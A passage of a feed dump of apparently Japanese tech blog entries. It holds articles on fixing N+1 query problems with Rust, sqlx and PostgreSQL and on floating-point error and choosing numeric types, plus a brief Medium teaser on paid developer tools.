データ配信)作者:マシュー・サイドディスカヴァー・トゥエンティワンAmazon新 失敗学 正解をつくる技術作者:畑村 洋太郎AudibleAmazonソフトウェア要求　第3版作者:カール ウィーガーズ；ジョイ ビーティ日経BPAmazon","isoDate":"2025-12-27T05:02:31.000Z","dateMiliSeconds":1766811751000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":" Rustにしたのに遅い？─ N+1クエリ問題の発見と解決","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/26/171102","contentSnippet":"はじめにRustは速い。だが、Rustで書けば速くなるわけではない。ある日、APIのレスポンスが突然5秒を超えた。コードを見直してもバグはない。SQLも正しく書けている。途方に暮れながらログを確認すると、1リクエストで300回以上もクエリが発行されていた。原因は、ループ内で著者情報を1件ずつ取得していたこと。これがN+1クエリ問題だ。見えないものは、直せない。本記事では、この見落とされがちなN+1クエリ問題の本質と、RustとPostgreSQLを使った5つの解決策を解説する。正直に言うと、どの解決策がベストかは状況による。だからこそ、複数のアプローチを知っておく価値があると私は考えている。N+1クエリ問題とは問題のあるコード本記事では、RustのSQLクライアントライブラリ「sqlx」を使用します。sqlxは型安全なクエリとasync/awaitをネイティブにサポートするライブラリです。// アンチパターン: N+1クエリasync fn get_posts_with_authors(pool: &PgPool) -> Result<Vec<PostWithAuthor>, sqlx::Error> {    // 1回目のクエリ: 投稿一覧を取得    let posts = sqlx::query_as!(Post, \\"SELECT * FROM posts LIMIT 100\\")        .fetch_all(pool)        .await?;    let mut result = Vec::with_capacity(posts.len());    for post in posts {        // N回のクエリ: 各投稿の著者を個別に取得        let author = sqlx::query_as!(            User,            \\"SELECT * FROM users WHERE user_id = $1\\",            post.user_id        )        .fetch_one(pool)        .await?;        result.push(PostWithAuthor { post, author });    }    Ok(result)}// 100件の投稿を取得するのに 101回のクエリが発生このコードは一見正しく見えますが、100件の投稿を取得するのに101回のクエリを発行しています。これが「N+1クエリ問題」の典型例です。「N+1」という名前は、N件のデータに対して1回（一覧取得）+ N回（個別取得）= N+1回のクエリが発生することに由来します。ここで疑問が浮かぶ。なぜこのパターンを書いてしまうのか。私の経験では、ループ内でfetch_oneを呼ぶコードは「書きやすい」からだ。1件取得する関数がすでにあれば、それをループで回すのは自然な発想に思える。問題は、この「自然さ」がパフォーマンスの問題になることだ。便利すぎるAPIは、時として危険なパターンを誘発する。では、具体的にどれくらい遅くなるのか。数字で見てみよう。なぜ遅いのかN+1クエリが遅い理由を定量的に理解しましょう。1クエリあたりのオーバーヘッド内訳:- RustからPostgreSQLライブラリへの呼び出し：0.01ms- プロトコル処理：0.02ms- ネットワーク往復（ローカル）：0.1-0.5ms- PostgreSQLクエリパース：0.05ms- 実行計画生成：0.1-1ms- 実行（インデックス使用時）：0.1-0.5ms- 結果のシリアライズ：0.02ms合計：約0.5-2ms/クエリ計算例100件のN+1クエリ:- 最良ケース: 101 \xd7 0.5ms = 50ms- 最悪ケース: 101 \xd7 2ms = 200msJOINで1クエリ:- 約1-5ms差: 10-100倍ネットワークレイテンシが大きい環境（クラウド、リモートDB）では、この差はより広がります。ここまでの計算で、N+1の影響の大きさは理解できた。では、この問題の根本にあるものは何だろうか。N+1問題の本質1回で済むことを、何度もやっていないか。N+1問題の本質は「ループ内のI/O」だと私は考えている。これは単なるSQLの問題ではなく、プログラミング一般に潜む構造的な課題だ。// 問題のパターンfor item in collection {    // 各アイテムごとにI/O（DB、ファイル、HTTP）    let related = fetch_related(item.id).await?;}この問題は以下のような場面で発生します。1対多の関連データ取得: 投稿とコメント、ユーザーと注文多対多の関連データ取得: 投稿とタグ、ユーザーとロールネストしたデータ構造: カテゴリ → 投稿 → コメント → ユーザー問題の構造がわかったところで、解決策を見ていこう。RustとPostgreSQLの組み合わせでは、5つのアプローチがある。シンプルなものから順に紹介する。解決策1: JOINで一括取得最もシンプルな解決策は、JOINを使って1回のクエリで全てのデータを取得することです。1対1の関連#[derive(Debug, sqlx::FromRow)]struct PostWithAuthor {    // 投稿の情報    post_id: Uuid,    title: String,    content: String,    post_created_at: DateTime<Utc>,    // 著者の情報    author_id: Uuid,    author_name: String,    author_email: String,}async fn get_posts_with_authors(pool: &PgPool) -> Result<Vec<PostWithAuthor>, sqlx::Error> {    sqlx::query_as!(        PostWithAuthor,        r#\\"        SELECT            p.post_id,            p.title,            p.content,            p.created_at as post_created_at,            u.user_id as author_id,            u.name as author_name,            u.email as author_email        FROM posts p        INNER JOIN users u ON p.user_id = u.user_id        ORDER BY p.created_at DESC        LIMIT 100        \\"#    )    .fetch_all(pool)    .await}JOINの種類と使い分け実務でよく使うのはINNER JOINとLEFT JOINの2つです。INNER JOINは両方のテーブルに存在する行のみを返し、関連データが必須の場合に使います。LEFT JOINは左テーブルの全行を返し、右テーブルは一致する行のみを返すため、関連データがオプションの場合に適しています。RIGHT JOINやFULL JOINは実務でほぼ使いません。// LEFT JOIN: 著者がいない投稿も含めるasync fn get_posts_with_optional_authors(pool: &PgPool) -> Result<Vec<PostWithOptionalAuthor>, sqlx::Error> {    sqlx::query_as!(        PostWithOptionalAuthor,        r#\\"        SELECT            p.post_id,            p.title,            u.user_id as \\"author_id?\\",            u.name as \\"author_name?\\"        FROM posts p        LEFT JOIN users u ON p.user_id = u.user_id        ORDER BY p.created_at DESC        \\"#    )    .fetch_all(pool)    .await}JOINは1対1の関連には最適だ。しかし、1対多の関連を取得しようとすると、行が膨張してしまう。投稿1件に対してタグが5つあれば、同じ投稿が5行に複製される。この問題を避けるには、別のアプローチが必要になる。解決策2: IN句 + HashMap1対多の関連を効率的に取得する場合、IN句とHashMapを組み合わせる方法が有効です。use std::collections::HashMap;async fn get_posts_with_tags(pool: &PgPool) -> Result<Vec<PostWithTags>, sqlx::Error> {    // 1. 投稿を取得    let posts = sqlx::query_as!(Post, \\"SELECT * FROM posts LIMIT 100\\")        .fetch_all(pool)        .await?;    let post_ids: Vec<Uuid> = posts.iter().map(|p| p.post_id).collect();    // 2. タグを一括取得（ANY配列演算子を使用）    let tags: Vec<PostTagRow> = sqlx::query_as!(        PostTagRow,        r#\\"        SELECT pt.post_id, t.tag_id, t.name        FROM post_tags pt        JOIN tags t USING (tag_id)        WHERE pt.post_id = ANY($1)        \\"#,        &post_ids    )    .fetch_all(pool)    .await?;    // 3. HashMapでグループ化（O(n)）    let mut tag_map: HashMap<Uuid, Vec<Tag>> = HashMap::new();    for row in tags {        tag_map            .entry(row.post_id)            .or_default()            .push(Tag { tag_id: row.tag_id, name: row.name });    }    // 4. 結果を組み立て    let result = posts        .into_iter()        .map(|post| {            let tags = tag_map.remove(&post.post_id).unwrap_or_default();            PostWithTags { post, tags }        })        .collect();    Ok(result)}// **2回のクエリで完了（N+1 → 2）**ANY vs IN の違い-- IN句: リテラル値のリストSELECT * FROM posts WHERE post_id IN (\'id1\', \'id2\', \'id3\');-- ANY: 配列パラメータSELECT * FROM posts WHERE post_id = ANY($1);  -- $1 は UUID[]sqlxでは配列パラメータとしてANYを使う方が便利です。パフォーマンス特性IN/ANY句のパフォーマンス:要素数     | 推奨アプローチ-----------|------------------< 100      | IN/ANY で問題なし100-1000   | IN/ANY + インデックス確認1000+      | 一時テーブル or UNNEST大量のIDがある場合の対処法です。async fn get_posts_with_many_ids(pool: &PgPool, ids: &[Uuid]) -> Result<Vec<Post>, sqlx::Error> {    // 大量のIDはUNNESTでJOIN    sqlx::query_as!(        Post,        r#\\"        SELECT p.*        FROM unnest($1::uuid[]) WITH ORDINALITY AS t(id, ord)        JOIN posts p ON p.post_id = t.id        ORDER BY t.ord        \\"#,        ids    )    .fetch_all(pool)    .await}IN句+HashMapは2回のクエリで済み、行の膨張も起きない。ただ、Rustでの組み立て処理が必要になる。もし1回のクエリで完結させたいなら、PostgreSQLの配列集約機能が使える。解決策3: PostgreSQL配列集約PostgreSQLのarray_aggを使うと、1回のクエリで1対多の関連をネストした形で取得できます。#[derive(Debug, sqlx::FromRow)]struct PostWithTags {    post_id: Uuid,    title: String,    content: String,    tags: Vec<String>,}async fn get_posts_with_tags_aggregated(pool: &PgPool) -> Result<Vec<PostWithTags>, sqlx::Error> {    sqlx::query_as!(        PostWithTags,        r#\\"        SELECT            p.post_id,            p.title,            p.content,            COALESCE(                array_agg(t.name) FILTER (WHERE t.name IS NOT NULL),                \'{}\'            ) as \\"tags!: Vec<String>\\"        FROM posts p        LEFT JOIN post_tags pt USING (post_id)        LEFT JOIN tags t USING (tag_id)        GROUP BY p.post_id        ORDER BY p.created_at DESC        LIMIT 100        \\"#    )    .fetch_all(pool)    .await}// **1回のクエリで完了**array_aggの注意点NULL処理: FILTER (WHERE ... IS NOT NULL) でNULLを除外する空配列: COALESCE(..., \'{}\') で関連がない時は空配列を返す重複: 必要に応じて array_agg(DISTINCT ...) を使用する複数の配列を同時に集約async fn get_posts_with_tags_and_categories(pool: &PgPool) -> Result<Vec<PostWithTagsAndCategories>, sqlx::Error> {    sqlx::query_as!(        PostWithTagsAndCategories,        r#\\"        SELECT            p.post_id,            p.title,            COALESCE(                array_agg(DISTINCT t.name) FILTER (WHERE t.name IS NOT NULL),                \'{}\'            ) as \\"tags!: Vec<String>\\",            COALESCE(                array_agg(DISTINCT c.name) FILTER (WHERE c.name IS NOT NULL),                \'{}\'            ) as \\"categories!: Vec<String>\\"        FROM posts p        LEFT JOIN post_tags pt USING (post_id)        LEFT JOIN tags t USING (tag_id)        LEFT JOIN post_categories pc USING (post_id)        LEFT JOIN categories c USING (category_id)        GROUP BY p.post_id        \\"#    )    .fetch_all(pool)    .await}array_aggは単純な値の配列には便利だ。タグ名やカテゴリ名のようなString型の配列なら、これで十分。しかし、コメントのように複数のフィールドを持つオブジェクトを集約したい時はどうだろうか。そこで登場するのがjson_aggだ。解決策4: json_aggによる複雑なネストarray_aggでは単純な値しか集約できませんが、json_aggを使えば複雑なオブジェクトをネストできます。use serde::Deserialize;use sqlx::types::Json;#[derive(Debug, Deserialize)]struct CommentJson {    comment_id: Uuid,    body: String,    created_at: DateTime<Utc>,}#[derive(Debug, sqlx::FromRow)]struct PostWithComments {    post_id: Uuid,    title: String,    comments: Json<Vec<CommentJson>>,}async fn get_posts_with_comments(pool: &PgPool) -> Result<Vec<PostWithComments>, sqlx::Error> {    sqlx::query_as!(        PostWithComments,        r#\\"        SELECT            p.post_id,            p.title,            COALESCE(                json_agg(                    json_build_object(                        \'comment_id\', c.comment_id,                        \'body\', c.body,                        \'created_at\', c.created_at                    )                    ORDER BY c.created_at DESC                ) FILTER (WHERE c.comment_id IS NOT NULL),                \'[]\'            ) as \\"comments!: Json<Vec<CommentJson>>\\"        FROM posts p        LEFT JOIN comments c USING (post_id)        GROUP BY p.post_id        ORDER BY p.created_at DESC        LIMIT 100        \\"#    )    .fetch_all(pool)    .await}jsonb_agg vs json_agg 関数  特徴  json_agg  テキストとして格納、出力がJSON文字列の順序を保持  jsonb_agg  バイナリ格納、重複キー削除、インデックス可能 単純な集約にはjson_agg、後で検索や操作をする時はjsonb_aggを使います。深いネスト構造async fn get_posts_full_detail(pool: &PgPool) -> Result<Vec<PostFullDetail>, sqlx::Error> {    sqlx::query_as!(        PostFullDetail,        r#\\"        SELECT            p.post_id,            p.title,            json_build_object(                \'user_id\', u.user_id,                \'name\', u.name            ) as \\"author!: Json<AuthorJson>\\",            COALESCE(                json_agg(                    json_build_object(                        \'comment_id\', c.comment_id,                        \'body\', c.body,                        \'commenter\', json_build_object(                            \'user_id\', cu.user_id,                            \'name\', cu.name                        )                    )                    ORDER BY c.created_at DESC                ) FILTER (WHERE c.comment_id IS NOT NULL),                \'[]\'            ) as \\"comments!: Json<Vec<CommentWithCommenterJson>>\\"        FROM posts p        JOIN users u ON p.user_id = u.user_id        LEFT JOIN comments c USING (post_id)        LEFT JOIN users cu ON c.user_id = cu.user_id        GROUP BY p.post_id, u.user_id        LIMIT 100        \\"#    )    .fetch_all(pool)    .await}ここまでの解決策はすべて、取得するデータが事前にわかっている場合に有効だ。SQLを書く時点で、どのテーブルをJOINするか、何を集約するかが決まっている。しかし、GraphQLのように「リクエストごとに取得対象が動的に変わる」時はどうだろうか。そこで登場するのがDataLoaderパターンだ。解決策5: DataLoaderパターンGraphQLなどで多用されるDataLoaderパターンは、複数の個別リクエストを自動的にバッチ化する仕組みです。use std::collections::HashMap;use tokio::sync::Mutex;pub struct UserLoader {    pool: PgPool,    cache: Mutex<HashMap<Uuid, User>>,}impl UserLoader {    pub fn new(pool: PgPool) -> Self {        Self {            pool,            cache: Mutex::new(HashMap::new()),        }    }    /// 複数のユーザーIDを一括でロード    pub async fn load_many(&self, ids: &[Uuid]) -> Result<HashMap<Uuid, User>, sqlx::Error> {        let mut cache = self.cache.lock().await;        // キャッシュにないIDを特定        let missing: Vec<Uuid> = ids            .iter()            .filter(|id| !cache.contains_key(id))            .copied()            .collect();        if !missing.is_empty() {            // 一括でDBから取得            let users: Vec<User> = sqlx::query_as!(                User,                \\"SELECT * FROM users WHERE user_id = ANY($1)\\",                &missing            )            .fetch_all(&self.pool)            .await?;            // キャッシュに追加            for user in users {                cache.insert(user.user_id, user);            }        }        // 結果を構築        let result = ids            .iter()            .filter_map(|id| cache.get(id).cloned().map(|u| (*id, u)))            .collect();        Ok(result)    }    /// 単一のユーザーをロード（内部的にはバッチ処理可能）    pub async fn load(&self, id: Uuid) -> Result<Option<User>, sqlx::Error> {        let map = self.load_many(&[id]).await?;        Ok(map.into_values().next())    }    /// リクエスト終了時にキャッシュをクリア    pub async fn clear(&self) {        self.cache.lock().await.clear();    }}DataLoaderの使用例async fn get_posts_with_authors_dataloader(    pool: &PgPool,    loader: &UserLoader,) -> Result<Vec<PostWithAuthor>, anyhow::Error> {    let posts = sqlx::query_as!(Post, \\"SELECT * FROM posts LIMIT 100\\")        .fetch_all(pool)        .await?;    // 全ユーザーIDを収集    let user_ids: Vec<Uuid> = posts.iter().map(|p| p.user_id).collect();    // 一括でロード    let users = loader.load_many(&user_ids).await?;    // 結果を組み立て    let result = posts        .into_iter()        .filter_map(|post| {            // ユーザーが見つからない投稿はスキップ            // または、Option<User>としてPostWithAuthorを定義する            users.get(&post.user_id).cloned().map(|author| {                PostWithAuthor { post, author }            })        })        .collect();    Ok(result)}より高度な自動バッチ化が必要な時は、async-graphqlのDataLoader実装を参照してください。5つの解決策を見てきた。では、どれを選べばいいのか。それぞれの特徴を整理してみよう。解決策の比較 方法  クエリ数  複雑さ  適用場面  JOIN  1  低  1対1、少量の1対多  IN句 + HashMap  2  中  1対多、多対多  array_agg  1  中  単純な値の1対多  json_agg  1  高  複雑なネスト構造  DataLoader  2+  高  GraphQL、動的なデータ取得 ここで一見すると「シンプルなJOINが最善」と思えるだろう。しかし、そう単純な話ではない。JOINは1対多で行が膨張し、json_aggは可読性を犠牲にする。シンプルさとパフォーマンスは常にトレードオフの関係にある。私の結論は、「まずJOINを試し、問題が出たらIN句+HashMapに移行する」という段階的アプローチだ。最初から複雑な解決策に飛びつく必要はない。選択の判断フローチャート解決策がわかっても、そもそもN+1が発生していることに気づかなければ意味がない。コードレビューで確認すべき項目をまとめておこう。N+1検出チェックリストコードレビューやPRレビューでは、まずループ内でquery_as!やquery!を呼んでいないかを確認してください。次に、for文の中に.awaitがあり、DBアクセスをしていないかをチェックします。最後に、APIレスポンスに必要なデータを1-2回のクエリで取得できているかを確認しましょう。まとめRustにしたのに遅い？—それはRustのせいではない。N+1クエリ問題は、言語の速さを帳消しにする。どれだけRustが速くても、100回のネットワーク往復は100回のネットワーク往復だ。言語を変えても、アーキテクチャの問題は解決しない。問題は、気づいた瞬間に半分解決している。N+1クエリ問題は、気づかないうちにパフォーマンスを劣化させる典型的なアンチパターンです。解決の基本原則は以下の3つです。ループ内でI/Oを行わない必要なデータは一括で取得する開発時にクエリ数を監視する「N+1を気にしすぎるとコードが複雑になる」という批判はあるだろう。確かにその通りだ。しかし、私の経験では、N+1問題は本番環境で突然顕在化することが多い。開発環境では10件のデータで問題なく動いていたコードが、本番で1000件になると破綻する。複雑さのコストより、本番障害のコストの方が高い。だからこそ、複数の解決策を知っておくことに価値がある。RustとPostgreSQLの組み合わせでは、JOIN、IN句、array_agg、json_agg、DataLoaderなど複数の解決策があり、状況に応じて適切な方法を選択できます。実測パフォーマンス比較実際にRust + sqlx + PostgreSQLで計測した結果を示します。 方法  クエリ数  実行時間  改善率  N+1パターン（アンチパターン）  51回  27.95ms  -  JOIN  1回  1.51ms  18.5倍高速  IN句 + HashMap  2回  1.71ms  16.3倍高速  DataLoader（初回）  2回  1.61ms  17.4倍高速  DataLoader（キャッシュヒット）  0回  0.013ms  2,150倍高速 計測条件:PostgreSQL 17 / Docker環境50件の記事、10人の著者ローカル接続（ネットワークレイテンシ最小）リモートDBやクラウド環境ではネットワークレイテンシが加算されるため、N+1の影響はより大きくなります。問題の深刻さがわかったところで、どうやって検出すればいいのか。開発から本番まで、各段階での対策を整理しておこう。検出のまとめN+1問題の検出には複数のレイヤーで対策を講じるべきです。 段階  手法  特徴  開発時  クエリカウンター、トレーシング  即座にフィードバック  テスト時  assert_max_queries、統合テスト  CI/CDで自動検出  コードレビュー  チェックリスト、静的解析  ループ内awaitを検出  本番環境  pg_stat_statements、OpenTelemetry  実際の影響を測定 特に重要なのは、開発初期段階での検出です。本番環境で発見されたN+1問題は、すでにユーザー体験に影響を与えており、修正にも時間がかかります。とはいえ、すべてのN+1を事前に防げるかと言われると、正直なところ難しい。新しいチームメンバーが入ってきたり、時間に追われたリリースがあったりすれば、どこかでN+1パターンが紛れ込む。完璧を目指すより、検出と修正のサイクルを回せる体制を作る方が現実的だと私は考えている。数えてみろ。数えれば見える。冒頭で触れた300回クエリの問題は、IN句+HashMapパターンで2回のクエリに削減でき、レスポンスは5秒から200msに改善した。次のコードレビューで、ループ内の.awaitを確認してみてください。参考資料syu-m-5151.hatenablog.comsqlx / Rustsqlx Documentationtracing cratesyn crate（AST解析）PostgreSQLPostgreSQL Array FunctionsPostgreSQL JSON Functionspg_stat_statementsauto_explainpg_stat_activityパターンDataLoader PatternAvoiding N+1 Queries (Rails/ActiveRecord、概念は共通)観測性OpenTelemetry Rusttracing-opentelemetry","isoDate":"2025-12-26T08:11:02.000Z","dateMiliSeconds":1766736662000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"10 Premium Tools for 10x Developers","link":"https://daisuke1024akagawa.medium.com/6-premium-tools-for-10x-developers-af6b17908014?source=rss-c54ac439ad2b------2","contentSnippet":"This time, I’ll introduce the 10 paid services I regularly use.Continue reading on Medium \xbb","isoDate":"2025-12-25T10:47:11.000Z","dateMiliSeconds":1766659631000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"0.1+0.2=0.30000000000000004 をRust/PostgreSQLで考える","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/25/192751","contentSnippet":"はじめにテストを書いていて、奇妙なことに気づいた。合計金額のアサーションが通らない。期待値は10.00なのに、実際の値は9.99999999999983。コードにバグはない。SQLも正しい。では何が問題なのか。調べた結果、犯人は浮動小数点の累積誤差だった。金額カラムにDOUBLE PRECISIONを使っていたのです。これは「浮動小数点の罠」とも呼ばれる、DB設計やアプリケーションの実装で陥りやすい問題だ。RustとPostgreSQLでWebサービスを構築する際に注意すべき点の1つで、金融システムや科学計算、測定データ、座標、パーセンテージなど、正確な数値が必要なあらゆる場面で問題になります。2進数と10進数の不一致コンピュータは2進数で数値を表現します。しかし、私たちが日常使う10進数の多くは2進数で正確に表現できません。0.1 (10進数) = 0.0001100110011... (2進数・無限循環小数)これはPostgreSQLやRustの問題ではなく、IEEE 754（コンピュータが小数を扱う国際標準規格）に基づくすべてのシステムに共通する問題です。fn main() {    let a = 0.1_f64;    let b = 0.2_f64;    let c = a + b;    println!(\\"{} + {} = {}\\", a, b, c);    // 出力: 0.1 + 0.2 = 0.30000000000000004    println!(\\"0.1 + 0.2 == 0.3 ? {}\\", c == 0.3);    // 出力: false}PostgreSQLの数値型PostgreSQLには大きく分けて3種類の数値型があります。浮動小数点型（近似値）浮動小数点型は近似値を扱う型で、内部的にはIEEE 754形式（2進数の浮動小数点）で表現されます。REAL（FLOAT4とも呼ばれる）は4バイトのストレージを使用し、有効桁数は6桁です。センサーデータやグラフィックスなど、高い精度を必要としない場面に適しています。DOUBLE PRECISION（FLOAT8とも呼ばれる）は8バイトを使用し、有効桁数は15桁に拡張されます。科学計算や座標データなど、より高い精度が求められる場面で使用します。任意精度型（正確値）NUMERIC（またはDECIMAL）は正確な計算が必要な場面で使用する型です。ストレージは可変長で、4桁ごとに2バイトを消費します。最大131,072桁までの精度をサポートしており、金額計算などで威力を発揮します。なお、PostgreSQLではNUMERICとDECIMALは完全に同一の型として扱われます。整数型整数型は小数を含まない数値を扱います。INTEGERは4バイトで\xb121億の範囲を扱え、カウンターやIDに適しています。BIGINTは8バイトで\xb1922京という広大な範囲をカバーし、大きな整数やセント単位での金額格納に使用できます。問題が発生する具体的な場面1. 等価比較の失敗-- PostgreSQLで確認SELECT 0.1::float8 + 0.2::float8 = 0.3::float8;-- 結果: falseSELECT 0.1::numeric + 0.2::numeric = 0.3::numeric;-- 結果: trueこれはWHERE句での検索に影響します。-- 見つからない可能性があるSELECT * FROM measurements WHERE value = 0.3;-- 確実に動作SELECT * FROM measurements WHERE ABS(value - 0.3) < 0.0001;2. 累積誤差-- 0.01を1000回加算CREATE TABLE test_float (amount DOUBLE PRECISION);CREATE TABLE test_numeric (amount NUMERIC(10,2));INSERT INTO test_float SELECT 0.01 FROM generate_series(1, 1000);INSERT INTO test_numeric SELECT 0.01 FROM generate_series(1, 1000);SELECT SUM(amount) FROM test_float;-- 結果: 9.99999999999983（期待値: 10.00）SELECT SUM(amount) FROM test_numeric;-- 結果: 10.00（正確）誤差は小さく見えますが、0.00017の誤差でも1000万レコードでは1700の誤差になります。月次決算で170万円ずれる可能性があるのです。3. 丸め方法の違いPostgreSQLのNUMERICとFLOATでは丸め方法が異なります。SELECT x,  round(x::numeric) AS numeric_round,  round(x::double precision) AS float_roundFROM (VALUES (-2.5), (-1.5), (1.5), (2.5)) AS t(x); x  NUMERIC  FLOAT  -2.5  -3  -2  -1.5  -2  -2  1.5  2  2  2.5  3  2 NUMERIC: ゼロから遠い方へ丸める（Midpoint Away From Zero）FLOAT: 最近偶数へ丸める（Banker\'s Rounding / IEEE 754）この違いは、同じ計算でも型によって結果が異なることを意味します。ドメイン別：FLOATを使えるか使用を避けるべき場面 ドメイン  理由  推奨型  金額・会計  1円/1セントの誤差も許されない  NUMERIC  税率・割引率  正確な計算が必要  NUMERIC  合計が一致すべきパーセンテージ  33.33% \xd7 3 = 100%が必要  NUMERIC  統計的有意性  p値の正確な比較  NUMERIC  監査証跡  再現可能性が必要  NUMERIC FLOATが許容される場面 ドメイン  理由  推奨型  センサーデータ  センサー自体の誤差 > FLOAT誤差  DOUBLE PRECISION  座標（GPS）  15桁精度で十分（1cm精度には7桁で十分）  DOUBLE PRECISION  温度・湿度  測定誤差が大きい  REAL or DOUBLE PRECISION  レーティング平均  表示時に丸める  DOUBLE PRECISION  グラフィックス  視覚的に認識できない  REAL 判断のフローチャート数値型を選択する際は、まず正確な10進数表現が必要かどうかを考えます。金額や税率など、誤差が許されない値を扱う場合は、迷わずNUMERIC/DECIMALを選択してください。正確な10進数表現が不要な場合は、次に必要な精度を検討します。15桁を超える精度が必要であれば、浮動小数点型では対応できないため、やはりNUMERICを使用します。15桁以下の精度で十分な場合は、ストレージ効率を考慮して浮動小数点型を選びます。6桁程度の精度で事足りるなら、4バイトで済むREALが適しています。それ以上の精度が必要であれば、8バイトのDOUBLE PRECISIONを選択してください。解決策1：適切な型の選択スキーマ設計例CREATE TABLE measurements (    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),    -- 正確さが必要な値    price NUMERIC(10, 2) NOT NULL,    tax_rate NUMERIC(5, 4) NOT NULL,    -- 近似値で十分な値    temperature DOUBLE PRECISION,    latitude DOUBLE PRECISION,    longitude DOUBLE PRECISION,    -- 整数で表現できる値    quantity INTEGER NOT NULL,    price_cents BIGINT,  -- 代替：セント単位格納    -- 制約    CONSTRAINT valid_tax_rate CHECK (tax_rate >= 0 AND tax_rate <= 1),    CONSTRAINT valid_latitude CHECK (latitude BETWEEN -90 AND 90),    CONSTRAINT valid_longitude CHECK (longitude BETWEEN -180 AND 180));precision（精度）とscale（スケール）の設計NUMERICはNUMERIC(precision, scale)の形式で定義します。precisionは全体の有効桁数、scaleは小数点以下の桁数を指定します。用途に応じた設定例を紹介します。一般的な金額にはNUMERIC(10, 2)が適しており、-99,999,999.99から99,999,999.99までの範囲を格納できます。税率や割引率にはNUMERIC(5, 4)を使用し、0.0000から0.9999までの値を扱えます。より細かい精度が必要な場面では、暗号通貨なら小数部8桁を確保できるNUMERIC(16, 8)、為替レートなら小数部6桁のNUMERIC(10, 6)が適切です。科学的測定など高精度が求められる場合は、NUMERIC(15, 10)のように大きな精度を確保してください。解決策2：Rustでの適切な型選択f64の限界を理解するfn demonstrate_float_issues() {    // 等価比較の問題    let a = 0.1_f64 + 0.2_f64;    let b = 0.3_f64;    assert!(a != b);  // 等しくない！    // 累積誤差    let mut sum = 0.0_f64;    for _ in 0..1000 {        sum += 0.01;    }    println!(\\"1000 \xd7 0.01 = {}\\", sum);  // 9.999999999999831    // 大きな値での精度損失    let big = 1_000_000_000_000_000.0_f64;    let next = big + 1.0;    println!(\\"{} + 1 = {}\\", big, next);  // 変化しない可能性}rust_decimalクレート正確な10進数計算が必要な時は以下を使用します。[dependencies]rust_decimal = { version = \\"1\\", features = [\\"db-postgres\\"] }rust_decimal_macros = \\"1\\"sqlx = { version = \\"0.8\\", features = [\\"postgres\\", \\"rust_decimal\\"] }use rust_decimal::Decimal;use rust_decimal_macros::dec;use std::str::FromStr;// 生成方法let d1 = dec!(19.99);                      // マクロ（推奨）let d2 = Decimal::from_str(\\"19.99\\")?;      // 文字列からlet d3 = Decimal::new(1999, 2);            // 整数 / 10^scale// f64からの変換は精度損失の可能性あり（避ける）let risky = Decimal::from_f64(19.99);      // Option<Decimal>浮動小数点の比較方法f64を使う場合、等価比較には専用クレートを使用します。use approx::{abs_diff_eq, relative_eq};let a = 0.1_f64 + 0.2_f64;let b = 0.3_f64;// 絶対誤差での比較assert!(abs_diff_eq!(a, b, epsilon = 1e-10));// 相対誤差での比較（大きな値でも適切に動作）assert!(relative_eq!(a, b, epsilon = 1e-10));丸め戦略の選択rust_decimalは複数の丸め戦略をサポートしています。use rust_decimal::prelude::*;use rust_decimal::RoundingStrategy;let value = dec!(2.5);// 各戦略の結果value.round_dp(0)  // MidpointNearestEven: 2（デフォルト）value.round_dp_with_strategy(0, RoundingStrategy::MidpointAwayFromZero)  // 3value.round_dp_with_strategy(0, RoundingStrategy::ToZero)  // 2（切り捨て）value.round_dp_with_strategy(0, RoundingStrategy::AwayFromZero)  // 3（切り上げ） 戦略  説明  2.5  -2.5  用途  MidpointNearestEven  Banker\'s丸め  2  -2  統計、科学計算  MidpointAwayFromZero  四捨五入  3  -3  一般的な丸め  ToZero  切り捨て  2  -2  税額計算（日本）  AwayFromZero  切り上げ  3  -3  天井関数的  ToPositiveInfinity  正方向へ  3  -2  ceil  ToNegativeInfinity  負方向へ  2  -3  floor 解決策3：sqlxとの連携型マッピング PostgreSQL  Rust  特徴  REAL  f32  近似値、高速  DOUBLE PRECISION  f64  近似値、高速  NUMERIC  Decimal  正確、やや遅い  BIGINT  i64  整数、最速 構造体定義use rust_decimal::Decimal;use sqlx::FromRow;use uuid::Uuid;#[derive(Debug, FromRow)]struct Product {    id: Uuid,    name: String,    price: Decimal,           // NUMERIC → Decimal    weight_kg: f64,           // DOUBLE PRECISION → f64（測定値）}#[derive(Debug, FromRow)]struct SensorReading {    id: Uuid,    temperature: f64,         // センサー誤差 > FLOAT誤差    humidity: f64,    latitude: f64,    longitude: f64,    recorded_at: chrono::DateTime<chrono::Utc>,}クエリ例use rust_decimal_macros::dec;// 正確な計算が必要な場合async fn calculate_total(pool: &PgPool, order_id: Uuid) -> Result<Decimal, sqlx::Error> {    sqlx::query_scalar!(        r#\\"        SELECT COALESCE(SUM(price * quantity), 0)::NUMERIC as \\"total!\\"        FROM order_items        WHERE order_id = $1        \\"#,        order_id    )    .fetch_one(pool)    .await}// 近似値で十分な場合async fn get_average_temperature(pool: &PgPool) -> Result<f64, sqlx::Error> {    sqlx::query_scalar!(        r#\\"SELECT AVG(temperature) as \\"avg!\\" FROM sensor_readings\\"#    )    .fetch_one(pool)    .await}解決策4：整数による固定小数点最もシンプルで高速な方法を紹介します。CREATE TABLE products (    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),    name VARCHAR(200) NOT NULL,    price_cents BIGINT NOT NULL,  -- $19.99 → 1999    CONSTRAINT positive_price CHECK (price_cents > 0));/// 型安全な金額ラッパー#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]struct Cents(i64);impl Cents {    fn new(cents: i64) -> Self {        Self(cents)    }    fn from_dollars(dollars: i64, cents: i64) -> Self {        Self(dollars * 100 + cents)    }    fn dollars(&self) -> i64 {        self.0 / 100    }    fn cents_part(&self) -> i64 {        self.0.abs() % 100    }}impl std::fmt::Display for Cents {    fn fmt(&self, f: &mut std::fmt::Formatter<\'_>) -> std::fmt::Result {        if self.0 < 0 {            write!(f, \\"-${}.{:02}\\", self.dollars().abs(), self.cents_part())        } else {            write!(f, \\"${}.{:02}\\", self.dollars(), self.cents_part())        }    }}impl std::ops::Add for Cents {    type Output = Self;    fn add(self, other: Self) -> Self {        Self(self.0 + other.0)    }}impl std::ops::Sub for Cents {    type Output = Self;    fn sub(self, other: Self) -> Self {        Self(self.0 - other.0)    }}利点:- 整数演算は常に正確- 最高のパフォーマンス- 